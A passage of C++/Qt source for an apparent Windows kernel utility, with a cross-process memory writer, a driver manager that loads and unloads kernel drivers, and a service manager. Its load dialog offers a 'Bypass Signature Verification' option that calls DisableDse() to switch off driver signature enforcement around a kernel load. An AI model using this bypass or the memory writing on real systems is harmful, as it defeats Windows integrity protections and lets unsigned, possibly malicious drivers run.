        const QStringList Tokens = Text.split(' ', Qt::SkipEmptyParts); if (Tokens.isEmpty() || Tokens.size() > 4096) { ShowWarningNotice(Page, "Memory", "Enter between 1 and 4096 hexadecimal bytes."); return; }
        std::vector<unsigned char> Bytes; Bytes.reserve(Tokens.size()); for (QString Token : Tokens) { if (Token.startsWith("0x", Qt::CaseInsensitive)) Token.remove(0, 2); bool Ok = false; const uint Value = Token.toUInt(&Ok, 16); if (!Ok || Token.size() > 2 || Value > 0xFF) { ShowWarningNotice(Page, "Memory", "Invalid hex byte: " + Token); return; } Bytes.push_back(static_cast<unsigned char>(Value)); }
        if (!WriteMemory(ProcessId, TargetAddress, Bytes.data(), static_cast<ULONG>(Bytes.size()))) { const QString Message = QString("Write failed (error %1)").arg(G_LastMultiDrvError); Status->setText(Message); ShowErrorNotice(Page, "Memory", Message); } else { const QString Message = QString("Wrote %1 byte(s).").arg(Bytes.size()); Status->setText(Message); ShowSuccessNotice(Page, "Memory", Message); }
    });
    return Page;
}

class DriverManagerPage final : public QWidget
{
    struct DriverRow
    {
        QString Name;
        QString DisplayName;
        QString Path;
        QString RegistryPath;
        DWORD State = 0;
        DWORD Type = 0;
        DWORD StartType = 0;
        DWORD ErrorControl = 0;
        ULONG_PTR DriverObject = 0;
        ULONG_PTR ImageBase = 0;
        DWORD ImageSize = 0;
        UserFileTrustInfo Trust;
    };
    struct DriverRefreshResult
    {
        std::vector<DriverRow> Rows;
        DWORD ErrorCode = ERROR_SUCCESS;
        NTSTATUS NtStatus = 0;
        bool Success = false;
    };
  public:
    explicit DriverManagerPage(QWidget *Parent = nullptr) : QWidget(Parent)
    {
        auto *Layout = new QVBoxLayout(this); ConfigurePageLayout(Layout);
        auto *LoadLayout = new QHBoxLayout;
        ConfigureToolbarLayout(LoadLayout);
        LoadLayout->addStretch(1);
        auto *LoadButton = MakeButton("Load", true);
        LoadLayout->addWidget(LoadButton);
        Layout->addLayout(LoadLayout);
        auto *FilterLayout = new QHBoxLayout;
        ConfigureToolbarLayout(FilterLayout);
        SearchEdit = new SearchLineEdit; SearchEdit->setPlaceholderText("Search service, display name, path, or state"); SearchEdit->setClearButtonEnabled(true);
        RefreshIndicator = new IndeterminateProgressRing(this, false);
        RefreshIndicator->setFixedSize(22, 22);
        RefreshIndicator->hide();
        RefreshButton = MakeButton("Refresh", true);
        FilterLayout->addWidget(SearchEdit, 1);
        FilterLayout->addWidget(RefreshIndicator);
        FilterLayout->addWidget(RefreshButton);
        Layout->addLayout(FilterLayout);
        DriverTable = MakeTable({"Service", "Display name", "State", "Type", "Object", "Base", "Size", "Signature", "SHA-256", "Path"});
        DriverTable->setSelectionMode(QAbstractItemView::SingleSelection); DriverTable->setContextMenuPolicy(Qt::CustomContextMenu);
        DriverTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        DriverTable->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch);
        DriverTable->horizontalHeader()->setSectionResizeMode(4, QHeaderView::ResizeToContents);
        DriverTable->horizontalHeader()->setSectionResizeMode(5, QHeaderView::ResizeToContents);
        DriverTable->horizontalHeader()->setSectionResizeMode(6, QHeaderView::ResizeToContents);
        DriverTable->horizontalHeader()->setSectionResizeMode(7, QHeaderView::ResizeToContents);
        DriverTable->horizontalHeader()->setSectionResizeMode(8, QHeaderView::Stretch);
        DriverTable->horizontalHeader()->setSectionResizeMode(9, QHeaderView::Stretch); Layout->addWidget(DriverTable, 1);
        QObject::connect(LoadButton, &QPushButton::clicked, this, [this] { ShowLoadDriverDialog(); });
        QObject::connect(RefreshButton, &QPushButton::clicked, this, [this] { StartRefresh(true); });
        QObject::connect(SearchEdit, &QLineEdit::textChanged, this, [this] { Populate(); });
        QObject::connect(DriverTable, &QWidget::customContextMenuRequested, this, [this](const QPoint &Position) {
            const QModelIndex Index = DriverTable->indexAt(Position); if (!Index.isValid()) return; DriverTable->selectRow(Index.row());
            const QString Name = DriverTable->item(Index.row(), 0)->text();
            auto *Menu = new RoundMenu(QString(), this);
            auto *InspectAction = new QAction("Inspect", Menu); Menu->addAction(InspectAction);
            ConnectMenuAction(InspectAction, this, [this, Name] { ShowDriverInspector(Name); });
            auto *UnloadAction = new QAction("Unload", Menu); Menu->addAction(UnloadAction);
            ConnectMenuAction(UnloadAction, this, [this, Name] {
                if (QMessageBox::question(this, "Unload Driver", "Unload driver and remove service " + Name + " if possible?") != QMessageBox::Yes) return;
                const auto DescribeWin32Error = [](DWORD ErrorCode) {
                    QString Message = QString("Win32 error: %1").arg(ErrorCode);
                    LPWSTR Buffer = nullptr;
                    const DWORD Length = FormatMessageW(
                        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                        nullptr,
                        ErrorCode,
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                        reinterpret_cast<LPWSTR>(&Buffer),
                        0,
                        nullptr);
                    if (Length != 0 && Buffer != nullptr) {
                        QString Reason = QString::fromWCharArray(Buffer).trimmed();
                        if (!Reason.isEmpty())
                            Message += "\nReason: " + Reason;
                    }
                    if (Buffer != nullptr)
                        LocalFree(Buffer);
                    return Message;
                };
                const auto BuildUnloadDriverError = [&](const DRIVER_CONTROL_OUTPUT &Output) {
                    const bool HasKernelResult =
                        Output.NtStatus != 0 ||
                        Output.Message[0] != L'\0' ||
                        Output.RegistryPath[0] != L'\0' ||
                        Output.ImagePath[0] != L'\0' ||
                        Output.State != 0 ||
                        Output.Type != 0 ||
                        Output.StartType != 0 ||
                        Output.ErrorControl != 0 ||
                        Output.DriverObject != 0 ||
                        Output.ImageBase != 0 ||
                        Output.ImageSize != 0;
                    const QString DriverMessage = HasKernelResult
                        ? QString::fromWCharArray(Output.Message[0] ? Output.Message : L"Kernel driver unload failed.")
                        : "DeviceIoControl(IOCTL_UNLOAD_DRIVER) failed before the driver returned a result.";
                    QString Message = QString("%1\nService: %2\nWin32 error: %3")
                        .arg(DriverMessage)
                        .arg(Name)
                        .arg(G_LastMultiDrvError);
                    if (HasKernelResult)
                        Message += QString("\nNTSTATUS: 0x%1").arg(static_cast<quint32>(Output.NtStatus), 8, 16, QLatin1Char('0'));
                    else
                        Message += "\nNTSTATUS: unavailable (IOCTL failed)";
                    if (HasKernelResult && Output.RegistryPath[0] != L'\0')
                        Message += "\nRegistry: " + QString::fromWCharArray(Output.RegistryPath);
                    if (HasKernelResult && Output.ImagePath[0] != L'\0')
                        Message += "\nImagePath: " + QString::fromWCharArray(Output.ImagePath);
                    return Message;
                };

                DRIVER_CONTROL_OUTPUT Output{};
                const std::wstring ServiceName = Name.toStdWString();
                const bool IsMultiDrv = Name.compare("MultiDrv", Qt::CaseInsensitive) == 0;
                if (IsMultiDrv) {
                    if (UnloadDriverService(ServiceName.c_str()) == 0)
                        ShowSuccessNotice(this, "Driver", "Driver unloaded via SCM mode.");
                    else
                        ShowErrorNotice(this, "Driver", "SCM unload failed.\nService: " + Name + "\n" + DescribeWin32Error(GetLastError()));
                    StartRefresh(false);
                    return;
                }

                if (!UnloadDriverKernel(ServiceName.c_str(), FALSE, &Output)) {
                    const QString KernelUnloadError = BuildUnloadDriverError(Output);
                    if (UnloadDriverService(ServiceName.c_str()) == 0) {
                        ShowSuccessNotice(this, "Driver",
                                          "Kernel unload failed; unloaded via SCM fallback.\nService: " + Name);
                    } else {
                        const DWORD ScmError = GetLastError();
                        ShowErrorNotice(this, "Driver",
                                        KernelUnloadError +
                                        "\n\nSCM fallback failed.\nService: " + Name + "\n" +
                                        DescribeWin32Error(ScmError));
                    }
                } else {
                    QString SuccessMessage = QString::fromWCharArray(
                        Output.Message[0] ? Output.Message : L"Kernel driver unloaded.");
                    if (UnloadDriverService(ServiceName.c_str()) == 0)
                        SuccessMessage += "\nSCM cleanup completed.";
                    else
                        SuccessMessage += "\nSCM cleanup failed.\n" + DescribeWin32Error(GetLastError());
                    ShowSuccessNotice(this, "Driver", SuccessMessage);
                }
                StartRefresh(false);
            });
            ReleaseMenuAfterClose(Menu); Menu->exec(DriverTable->viewport()->mapToGlobal(Position));
        });
        StartRefresh(false);
    }
  private:
    void ShowLoadDriverDialog()
    {
        auto *Dialog = new QDialog(this);
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        Dialog->setWindowTitle("Load Driver");
        Dialog->setModal(true);
        Dialog->resize(560, 180);

        auto *Layout = new QVBoxLayout(Dialog);
        Layout->setContentsMargins(20, 18, 20, 18);
        Layout->setSpacing(14);

        auto *ServiceEdit = new LineEdit;
        ServiceEdit->setPlaceholderText("Service name");

        auto *PathEdit = new LineEdit;
        PathEdit->setPlaceholderText("Driver .sys path");
        auto *ModeCombo = new ComboBox;
        ModeCombo->addItems({"KernelMode", "SCMMode"});
        ModeCombo->setCurrentIndex(0);
        auto *BypassSignatureCheck = new CheckBox("Bypass Signature Verification (BSOD Warning)");
        auto *BrowseButton = MakeButton("Browse");
        auto *PathLayout = new QHBoxLayout;
        ConfigureToolbarLayout(PathLayout);
        PathLayout->addWidget(PathEdit, 1);
        PathLayout->addWidget(BrowseButton);

        auto *ButtonLayout = new QHBoxLayout;
        ConfigureToolbarLayout(ButtonLayout);
        ButtonLayout->addStretch(1);
        auto *CancelButton = MakeButton("Cancel");
        auto *ConfirmButton = MakeButton("Load", true);
        ButtonLayout->addWidget(CancelButton);
        ButtonLayout->addWidget(ConfirmButton);

        Layout->addWidget(MakeLabel("Service name", 11, KTextPrimary, QFont::DemiBold));
        Layout->addWidget(ServiceEdit);
        Layout->addWidget(MakeLabel("Driver path", 11, KTextPrimary, QFont::DemiBold));
        Layout->addLayout(PathLayout);
        Layout->addWidget(MakeLabel("Load mode", 11, KTextPrimary, QFont::DemiBold));
        Layout->addWidget(ModeCombo);
        Layout->addWidget(BypassSignatureCheck);
        Layout->addLayout(ButtonLayout);

        QObject::connect(ModeCombo, &ComboBox::currentTextChanged, Dialog, [BypassSignatureCheck](const QString &Text) {
            const bool KernelModeSelected = Text == "KernelMode";
            BypassSignatureCheck->setEnabled(KernelModeSelected);
            if (!KernelModeSelected)
                BypassSignatureCheck->setChecked(false);
        });

        QObject::connect(BrowseButton, &QPushButton::clicked, Dialog, [Dialog, PathEdit, ServiceEdit] {
            const QString Path = QFileDialog::getOpenFileName(Dialog, "Select Driver", PathEdit->text(), "Driver files (*.sys)");
            if (Path.isEmpty())
                return;
            PathEdit->setText(QDir::toNativeSeparators(Path));
            if (ServiceEdit->text().trimmed().isEmpty())
                ServiceEdit->setText(QFileInfo(Path).completeBaseName());
        });
        QObject::connect(CancelButton, &QPushButton::clicked, Dialog, &QDialog::reject);
        const auto BuildLoadDriverError = [](const DRIVER_CONTROL_OUTPUT &Output,
                                             const std::wstring &ServiceName,
                                             const std::wstring &RequestedPath,
                                             const std::wstring &KernelPath) {
            const bool HasKernelResult =
                Output.NtStatus != 0 ||
                Output.Message[0] != L'\0' ||
                Output.RegistryPath[0] != L'\0' ||
                Output.ImagePath[0] != L'\0' ||
                Output.State != 0 ||
                Output.Type != 0 ||
                Output.StartType != 0 ||
                Output.ErrorControl != 0 ||
                Output.DriverObject != 0 ||
                Output.ImageBase != 0 ||
                Output.ImageSize != 0;
            const QString DriverMessage = HasKernelResult
                ? QString::fromWCharArray(Output.Message[0] ? Output.Message : L"Kernel driver load failed.")
                : "DeviceIoControl(IOCTL_LOAD_DRIVER) failed before the driver returned a result.";
            const QString DriverDetails = QString::fromStdWString(G_LastMultiDrvDetails);
            const QString EffectiveKernelPath = QString::fromWCharArray(
                Output.ImagePath[0] ? Output.ImagePath : KernelPath.c_str());
            const QString EffectiveRegistryPath = QString::fromWCharArray(Output.RegistryPath);
            QString Message = QString("%1\nService: %2\nRequested path: %3\nKernel path: %4\nWin32 error: %5")
                .arg(DriverMessage)
                .arg(QString::fromStdWString(ServiceName))
                .arg(QString::fromStdWString(RequestedPath))
                .arg(EffectiveKernelPath)
                .arg(G_LastMultiDrvError);
            if (HasKernelResult)
                Message += QString("\nNTSTATUS: 0x%1").arg(static_cast<quint32>(Output.NtStatus), 8, 16, QLatin1Char('0'));
            else
                Message += "\nNTSTATUS: unavailable (IOCTL failed)";
            if (HasKernelResult && !EffectiveRegistryPath.isEmpty())
                Message += "\nRegistry: " + EffectiveRegistryPath;
            if (HasKernelResult && !DriverDetails.isEmpty())
                Message += "\nDetails: " + DriverDetails;
            return Message;
        };
        const auto DescribeWin32Error = [](DWORD ErrorCode) {
            QString Message = QString("Win32 error: %1").arg(ErrorCode);
            LPWSTR Buffer = nullptr;
            const DWORD Length = FormatMessageW(
                FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                nullptr,
                ErrorCode,
                MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                reinterpret_cast<LPWSTR>(&Buffer),
                0,
                nullptr);
            if (Length != 0 && Buffer != nullptr) {
                QString Reason = QString::fromWCharArray(Buffer).trimmed();
                if (!Reason.isEmpty())
                    Message += "\nReason: " + Reason;
            }
            if (Buffer != nullptr)
                LocalFree(Buffer);
            return Message;
        };
        QObject::connect(ConfirmButton, &QPushButton::clicked, Dialog, [this, Dialog, ServiceEdit, PathEdit, ModeCombo, BypassSignatureCheck, BuildLoadDriverError, DescribeWin32Error] {
            const QString RequestedPathText = QDir::toNativeSeparators(PathEdit->text().trimmed());
            const std::wstring Path = RequestedPathText.toStdWString();
            const std::wstring Name = ServiceEdit->text().trimmed().toStdWString();
            const bool BypassSignatureVerification = BypassSignatureCheck->isChecked();
            const bool UseKernelMode = ModeCombo->currentText() == "KernelMode";
            if (Path.empty() || Name.empty()) {
                ShowWarningNotice(Dialog, "Driver", "Enter a service name and driver path.");
                return;
            }
            if (!UseKernelMode) {
                if (LoadDriverService(Path.c_str(), Name.c_str()) == 0) {
                    ShowSuccessNotice(this, "Driver",
                                      "Driver loaded via SCM mode.\nRequested path: " + RequestedPathText);
                    Dialog->accept();
                    StartRefresh(false);
                    return;
                }

                ShowErrorNotice(Dialog, "Driver",
                                "SCM mode load failed.\nRequested path: " + RequestedPathText +
                                "\n" + DescribeWin32Error(GetLastError()));
                return;
            }
            QString KernelPathText;
            if (!ConvertDriverServiceImagePath(RequestedPathText, KernelPathText)) {
                ShowErrorNotice(Dialog, "Driver",
                                "Unable to convert path to kernel path.\nRequested path: " + RequestedPathText);
                return;
            }

            const std::wstring KernelPath = KernelPathText.toStdWString();
            DRIVER_CONTROL_OUTPUT Output{};
            const auto TryLoad = [&]() {
                return LoadDriverKernel(Name.c_str(), KernelPath.c_str(), &Output);
            };

            if (BypassSignatureVerification)
                DisableDse();

            if (!TryLoad()) {
                const QString KernelLoadError = BuildLoadDriverError(Output, Name, Path, KernelPath);
                if (BypassSignatureVerification)
                    RestoreDse();

                if (LoadDriverService(Path.c_str(), Name.c_str()) == 0) {
                    ShowSuccessNotice(this, "Driver",
                                      "Kernel load failed; loaded via SCM fallback.\n"
                                      "Requested path: " + RequestedPathText + "\n"
                                      "Kernel path: " + KernelPathText);
                    Dialog->accept();
                    StartRefresh(false);
                    return;
                }

                const DWORD ScmError = GetLastError();
                ShowErrorNotice(
                    Dialog,
                    "Driver",
                    KernelLoadError +
                    "\n\nSCM fallback failed.\nRequested path: " + RequestedPathText +
                    "\n" + DescribeWin32Error(ScmError));
                return;
            }

            ShowSuccessNotice(this, "Driver",
                              "Kernel driver loaded.\nKernel path: " + KernelPathText);
            if (BypassSignatureVerification)
                RestoreDse();
            Dialog->accept();
            StartRefresh(false);
        });

        Dialog->show();
    }

    void ShowDriverInspector(const QString &Name)
    {
        auto *Dialog = new QDialog(this); Dialog->setAttribute(Qt::WA_DeleteOnClose);
        Dialog->setWindowTitle("Driver Inspector - " + Name); Dialog->resize(1040, 680);
        auto *Layout = new QVBoxLayout(Dialog);
        auto *Tabs = new QTabWidget;
        auto *Overview = MakeTable({"Kind", "Name", "Address", "Value", "Source"});
        auto *Dispatch = MakeTable({"Major function", "Address", "Source"});
        auto *Devices = MakeTable({"Device", "Attached", "Type", "Characteristics", "Flags", "Stack"});
        Tabs->addTab(Overview, "Overview"); Tabs->addTab(Dispatch, "Dispatch"); Tabs->addTab(Devices, "Devices"); Layout->addWidget(Tabs, 1);
        auto *Close = MakeButton("Close", true); Layout->addWidget(Close, 0, Qt::AlignRight);
        QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept); Dialog->show();
        QPointer<QDialog> SafeDialog(Dialog);
        std::thread([SafeDialog, Name, Overview, Dispatch, Devices] {
            std::vector<MDV2_RECORD> Records; MDV2_LIST_HEADER Header{};
            QueryNamedDriverRecordsV2(Name.toStdWString(), Records, &Header);
            QMetaObject::invokeMethod(qApp, [SafeDialog, Overview, Dispatch, Devices, Records = std::move(Records), Header] {
                if (!SafeDialog) return;
                const auto Add = [](QTableWidget *Table, const QStringList &Values) {
                    const int Row = Table->rowCount(); Table->insertRow(Row);
                    for (int Column = 0; Column < Values.size(); ++Column) Table->setItem(Row, Column, new QTableWidgetItem(Values[Column]));
                    Table->setRowHeight(Row, 36);
                };
                for (const auto &Record : Records) {
                    const QString Address = QString("0x%1").arg(Record.Address, 0, 16).toUpper();
                    if (Record.Kind == 8) Add(Dispatch, {QString::fromWCharArray(Record.Name), Address, QString::number(Record.Source)});
                    else if (Record.Kind == 15) Add(Devices, {Address, QString("0x%1").arg(Record.Value[0], 0, 16).toUpper(),
                        QString::number(Record.Value[1]), QString("0x%1").arg(Record.Value[2], 0, 16).toUpper(),
                        QString("0x%1").arg(Record.Value[3], 0, 16).toUpper(), QString::number(Record.Value[4])});
                    else Add(Overview, {QString::number(Record.Kind), QString::fromWCharArray(Record.Name), Address,
                                        QString("0x%1").arg(Record.Value[0], 0, 16).toUpper(), QString::number(Record.Source)});
                }
                if (Records.empty()) Add(Overview, {"Unavailable", {}, {},
                    QString("0x%1").arg(static_cast<quint32>(Header.Status), 8, 16, QLatin1Char('0')).toUpper(), {}});
            }, Qt::QueuedConnection);
        }).detach();
    }

    QString StateName(DWORD State) const
    {
        switch (State) { case SERVICE_STOPPED: return "Stopped"; case SERVICE_START_PENDING: return "StartPending"; case SERVICE_STOP_PENDING: return "StopPending";
        case SERVICE_RUNNING: return "Running"; case SERVICE_CONTINUE_PENDING: return "ContinuePending"; case SERVICE_PAUSE_PENDING: return "PausePending"; case SERVICE_PAUSED: return "Paused"; default: return "Unknown"; }
    }
    QString HexPtr(ULONG_PTR Value) const
    {
        return QString("0x%1").arg(Value, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper();
    }
    QString StartTypeName(DWORD Value) const
    {
        switch (Value) { case 0: return "Boot"; case 1: return "System"; case 2: return "Auto"; case 3: return "Demand"; case 4: return "Disabled"; default: return QString::number(Value); }
    }
    void StartRefresh(bool ShowResult)
    {
        if (Refreshing.exchange(true))
            return;

        if (RefreshButton)
        {
            RefreshButton->setEnabled(false);
            RefreshButton->setText("Refreshing...");
        }
        if (RefreshIndicator)
        {
            RefreshIndicator->show();
            RefreshIndicator->start();
        }
        QPointer<DriverManagerPage> SafeThis(this);
        std::thread([SafeThis, ShowResult] {
            DriverRefreshResult Result;
            DRIVER_ENUM_HEADER Header{};
            std::vector<DRIVER_ENUM_ENTRY> Entries;
            Result.Success = QueryDriverEntries(Entries, &Header);
            Result.ErrorCode = G_LastMultiDrvError;
            Result.NtStatus = Header.NtStatus;
            if (Result.Success || Header.NtStatus != 0)
            {
                Result.Success = true;
                for (const DRIVER_ENUM_ENTRY &Entry : Entries)
                {
                    DriverRow Row;
                    Row.Name = QString::fromWCharArray(Entry.ServiceName);
                    Row.DisplayName = QString::fromWCharArray(Entry.DisplayName);
                    Row.Path = QString::fromWCharArray(Entry.ImagePath);
                    Row.RegistryPath = QString::fromWCharArray(Entry.RegistryPath);
                    Row.State = Entry.State;
                    Row.Type = Entry.Type;
                    Row.StartType = Entry.StartType;
                    Row.ErrorControl = Entry.ErrorControl;
                    Row.DriverObject = Entry.DriverObject;
                    Row.ImageBase = Entry.ImageBase;
                    Row.ImageSize = Entry.ImageSize;
                    Row.Path = NormalizeUserDriverPath(Row.Path);
                    if (QFileInfo::exists(Row.Path)) Row.Trust = QueryUserFileTrustCached(Row.Path);
                    Result.Rows.push_back(std::move(Row));
                }
                std::sort(Result.Rows.begin(), Result.Rows.end(), [](const DriverRow &Left, const DriverRow &Right) {
                    if (Left.State != Right.State)
                        return Left.State == SERVICE_RUNNING;
                    return Left.Name.compare(Right.Name, Qt::CaseInsensitive) < 0;
                });
            }

            QMetaObject::invokeMethod(qApp, [SafeThis, ShowResult, Result = std::move(Result)]() mutable {
                if (!SafeThis)
                    return;
                SafeThis->Refreshing = false;
                if (SafeThis->RefreshIndicator)
                {
                    SafeThis->RefreshIndicator->stop();
                    SafeThis->RefreshIndicator->hide();
                }
                if (SafeThis->RefreshButton)
                {
                    SafeThis->RefreshButton->setText("Refresh");
                    SafeThis->RefreshButton->setEnabled(true);
                }
                if (!Result.Success)
                {
                    SafeThis->Rows.clear();
                    SafeThis->Populate();
                    const QString Message =
                        QString("Kernel enumeration failed (error %1).").arg(Result.ErrorCode);
                    if (ShowResult)
                        ShowErrorNotice(SafeThis, "Driver", Message);
                    return;
                }

                SafeThis->Rows = std::move(Result.Rows);
                SafeThis->Populate();
                if (ShowResult)
                    ShowSuccessNotice(SafeThis, "Driver",
                                      QString("Enumerated %1 driver(s).").arg(SafeThis->Rows.size()));
            }, Qt::QueuedConnection);
        }).detach();
    }
    void Populate()
    {
        const QString Query = SearchEdit->text().trimmed(); DriverTable->clearContents(); DriverTable->setRowCount(0);
        for (const DriverRow &Driver : Rows) { const QString State = StateName(Driver.State); const QString Text = Driver.Name + " " + Driver.DisplayName + " " + Driver.Path + " " + Driver.RegistryPath + " " + State + " " + Driver.Trust.Signer + " " + Driver.Trust.Sha256 + " " + HexPtr(Driver.DriverObject) + " " + HexPtr(Driver.ImageBase);
            if (!Query.isEmpty() && !Text.contains(Query, Qt::CaseInsensitive)) continue; const int Row = DriverTable->rowCount(); DriverTable->insertRow(Row);
            DriverTable->setItem(Row, 0, new QTableWidgetItem(Driver.Name)); DriverTable->setItem(Row, 1, new QTableWidgetItem(Driver.DisplayName)); DriverTable->setItem(Row, 2, new QTableWidgetItem(State));
            DriverTable->setItem(Row, 3, new QTableWidgetItem(QString("0x%1").arg(Driver.Type, 0, 16)));
            DriverTable->setItem(Row, 4, new QTableWidgetItem(HexPtr(Driver.DriverObject)));
            DriverTable->setItem(Row, 5, new QTableWidgetItem(HexPtr(Driver.ImageBase)));
            DriverTable->setItem(Row, 6, new QTableWidgetItem(QString("0x%1").arg(Driver.ImageSize, 0, 16)));
            DriverTable->setItem(Row, 7, new QTableWidgetItem(Driver.Trust.Trusted ? Driver.Trust.SignatureKind + " | " + Driver.Trust.Signer : "Untrusted"));
            DriverTable->setItem(Row, 8, new QTableWidgetItem(Driver.Trust.Sha256));
            DriverTable->setItem(Row, 9, new QTableWidgetItem(Driver.Path)); DriverTable->setRowHeight(Row, 38); }
    }
    SearchLineEdit *SearchEdit = nullptr; TableWidget *DriverTable = nullptr; PushButton *RefreshButton = nullptr; IndeterminateProgressRing *RefreshIndicator = nullptr; std::vector<DriverRow> Rows; std::atomic_bool Refreshing = false;
};

QWidget *CreateDriverPage() { return new DriverManagerPage; }

class ServiceManagerPage final : public QWidget
{
    struct ServiceRow {
        QString Name, DisplayName, State, StartType, BinaryPath;
        DWORD Pid, Type;
    };

public:
    explicit ServiceManagerPage(QWidget *Parent = nullptr) : QWidget(Parent)
    {
        auto *Layout = new QVBoxLayout(this);
        ConfigurePageLayout(Layout);
        auto *Toolbar = new QHBoxLayout;
        ConfigureToolbarLayout(Toolbar);
        RefreshButton = MakeButton("Refresh", true);
        SearchEdit = new SearchLineEdit;
        SearchEdit->setPlaceholderText("Search service name, display, or path");
        SearchEdit->setClearButtonEnabled(true);
        SearchEdit->setMaximumWidth(440);
        Toolbar->addWidget(SearchEdit);
        Toolbar->addStretch();
        Toolbar->addWidget(RefreshButton);
        Layout->addLayout(Toolbar);
        Table = MakeTable({"Service", "Display Name", "State", "Start Type", "PID", "Path"});
        Table->setContextMenuPolicy(Qt::CustomContextMenu);
        Layout->addWidget(Table, 1);
        QObject::connect(SearchEdit, &QLineEdit::textChanged, this, [this] { Populate(); });
        QObject::connect(RefreshButton, &QPushButton::clicked, this, [this] { Refresh(); ShowSuccessNotice(this, "Service", "Service list refreshed."); });
        QObject::connect(Table, &QWidget::customContextMenuRequested, this, [this](const QPoint &P) { ShowMenu(P); });
        Refresh();
    }

private:
    void Refresh()
    {
        Rows.clear();
        SC_HANDLE Scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
        if (!Scm) return;
        DWORD Needed = 0, Count = 0, Resume = 0;
        EnumServicesStatusExW(Scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32 | SERVICE_DRIVER,
            SERVICE_STATE_ALL, NULL, 0, &Needed, &Count, &Resume, NULL);
        if (Needed == 0) { CloseServiceHandle(Scm); return; }
        std::vector<BYTE> Buf(Needed);
        if (EnumServicesStatusExW(Scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32 | SERVICE_DRIVER,
            SERVICE_STATE_ALL, Buf.data(), Needed, &Needed, &Count, &Resume, NULL))
        {
            auto *Services = reinterpret_cast<LPENUM_SERVICE_STATUS_PROCESSW>(Buf.data());
            for (DWORD i = 0; i < Count; i++)
            {
                ServiceRow Row;
                Row.Name = QString::fromWCharArray(Services[i].lpServiceName);
                Row.DisplayName = QString::fromWCharArray(Services[i].lpDisplayName);
                Row.Pid = Services[i].ServiceStatusProcess.dwProcessId;
                Row.Type = Services[i].ServiceStatusProcess.dwServiceType;

                switch (Services[i].ServiceStatusProcess.dwCurrentState)
                {
                case SERVICE_RUNNING: Row.State = "Running"; break;
                case SERVICE_STOPPED: Row.State = "Stopped"; break;
                case SERVICE_PAUSED: Row.State = "Paused"; break;
                case SERVICE_START_PENDING: Row.State = "Starting..."; break;
                case SERVICE_STOP_PENDING: Row.State = "Stopping..."; break;
                default: Row.State = QString("Unknown(%1)").arg(Services[i].ServiceStatusProcess.dwCurrentState); break;
                }

                SC_HANDLE Svc = OpenServiceW(Scm, Services[i].lpServiceName, SERVICE_QUERY_CONFIG);
                if (Svc)
                {
                    DWORD CfgSize = 0;
                    QueryServiceConfigW(Svc, NULL, 0, &CfgSize);
                    if (CfgSize >= sizeof(QUERY_SERVICE_CONFIGW))
                    {
                        std::vector<BYTE> CfgBuf(CfgSize);
                        auto *Cfg = reinterpret_cast<LPQUERY_SERVICE_CONFIGW>(CfgBuf.data());
                        DWORD CfgOutSize = static_cast<DWORD>(CfgBuf.size());
                        if (QueryServiceConfigW(Svc, Cfg, CfgOutSize, &CfgSize))
                        {
                            Row.BinaryPath = QString::fromWCharArray(Cfg->lpBinaryPathName);
                            switch (Cfg->dwStartType)
                            {
                            case SERVICE_BOOT_START: Row.StartType = "Boot"; break;
                            case SERVICE_SYSTEM_START: Row.StartType = "System"; break;
                            case SERVICE_AUTO_START: Row.StartType = "Auto"; break;
                            case SERVICE_DEMAND_START: Row.StartType = "Manual"; break;
                            case SERVICE_DISABLED: Row.StartType = "Disabled"; break;
                            default: Row.StartType = QString::number(Cfg->dwStartType); break;
                            }
                        }
                    }
                    CloseServiceHandle(Svc);
                }
                else
                {
                    Row.BinaryPath = "-";
                    Row.StartType = "-";
                }
                Rows.push_back(std::move(Row));
            }
        }
        CloseServiceHandle(Scm);
        Populate();
    }

    void Populate()
    {
        const QString Query = SearchEdit->text().trimmed();
        Table->clearContents();
        Table->setRowCount(0);
        for (const auto &Svc : Rows)
        {
            if (!Query.isEmpty() &&
                !Svc.Name.contains(Query, Qt::CaseInsensitive) &&
                !Svc.DisplayName.contains(Query, Qt::CaseInsensitive) &&
                !Svc.BinaryPath.contains(Query, Qt::CaseInsensitive))
                continue;
            int R = Table->rowCount();
            Table->insertRow(R);
            Table->setItem(R, 0, new QTableWidgetItem(Svc.Name));
            Table->setItem(R, 1, new QTableWidgetItem(Svc.DisplayName));
            Table->setItem(R, 2, new QTableWidgetItem(Svc.State));
            Table->setItem(R, 3, new QTableWidgetItem(Svc.StartType));
            Table->setItem(R, 4, new QTableWidgetItem(Svc.Pid ? QString::number(Svc.Pid) : "-"));
            Table->setItem(R, 5, new QTableWidgetItem(Svc.BinaryPath));
            Table->setRowHeight(R, 38);
        }
    }

    void ShowMenu(const QPoint &Pos)
    {
        int Row = Table->indexAt(Pos).row();
        if (Row < 0 || Row >= static_cast<int>(Rows.size())) return;
        Table->selectRow(Row);
        const auto &Svc = Rows[Row];
        auto *Menu = new RoundMenu(QString(), this);

        auto AddAct = [this, Menu, &Svc](const QString &Text, std::function<void()> Fn) {
            auto *Item = new QAction(Text, Menu);
            Menu->addAction(Item);
            QObject::connect(Item, &QAction::triggered, this, [this, Text, Fn] {
                Fn();
                QTimer::singleShot(250, this, [this] { Refresh(); });
            });
        };

        if (Svc.State == "Stopped") AddAct("Start", [&Svc] {
            std::wstring Wide(reinterpret_cast<const wchar_t*>(Svc.Name.utf16()), Svc.Name.size());
            SC_HANDLE Scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
            if (Scm) {
                SC_HANDLE S = OpenServiceW(Scm, Wide.c_str(), SERVICE_START);
                if (S) { StartServiceW(S, 0, NULL); CloseServiceHandle(S); }
                CloseServiceHandle(Scm);
            }
        });
        if (Svc.State == "Running") AddAct("Stop", [&Svc] {
